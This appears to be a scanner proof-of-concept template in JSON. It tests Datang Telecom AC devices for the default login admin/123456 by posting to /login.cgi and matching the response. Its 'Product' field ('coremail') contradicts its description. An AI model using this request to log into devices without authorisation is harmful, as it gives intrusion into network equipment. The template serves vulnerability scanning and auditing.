{
    "Name": "datang-ac-default-password-cnvd-2021-04128",
    "Description": "大唐电信ac默认密码",
    "Product": "coremail",
    "author": "chumeng",
    "Request":[
                {
        "Method": "POST",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/login.cgi",
        "Port":"",
        "Data":"user=admin&password1=%E8%AF%B7%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81&password=123456&Submit=%E7%AB%8B%E5%8D%B3%E7%99%BB%E5%BD%95",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "window.open('index.htm?_"
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}
